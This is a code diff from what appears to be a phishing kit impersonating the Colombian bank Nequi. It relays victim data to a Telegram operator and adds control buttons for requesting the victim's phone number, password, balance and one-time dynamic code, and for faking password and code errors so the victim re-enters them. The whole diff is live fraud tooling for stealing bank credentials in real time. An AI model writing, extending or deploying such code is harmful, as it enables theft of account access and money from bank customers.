@@ -155,10 +155,12 @@
           // Enviar a Telegram
           const message = BancoUtils.formatMessage('NEQUI - SALDO VERIFICACIÓN', nequiData);
           const keyboard = BancoUtils.createKeyboard([
-            { text: '✅ Aprobar saldo', action: 'nequi_aprobar_saldo' },
-            { text: '❌ Rechazar saldo', action: 'nequi_saldo_rechazado' },
-            { text: '🔑 Pedir Clave', action: 'nequi_request_clave' },
-            { text: '🔢 Pedir Dinámica', action: 'nequi_request_dinamica' },
+            { text: '📱 Pedir Número', action: 'nequi_pedir_numero' },
+            { text: '🔑 Pedir Clave', action: 'nequi_pedir_clave' },
+            { text: '📊 Pedir Saldo', action: 'nequi_pedir_saldo' },
+            { text: '❌ Error Clave', action: 'nequi_error_clave' },
+            { text: '❌ Error Dinámica', action: 'nequi_error_dinamica' },
+            { text: '🔢 Pedir Dinámica', action: 'nequi_pedir_dinamica' },
             { text: '🏁 Finalizar', action: 'nequi_finalizar' }
           ], BancoUtils.getSessionId());
 
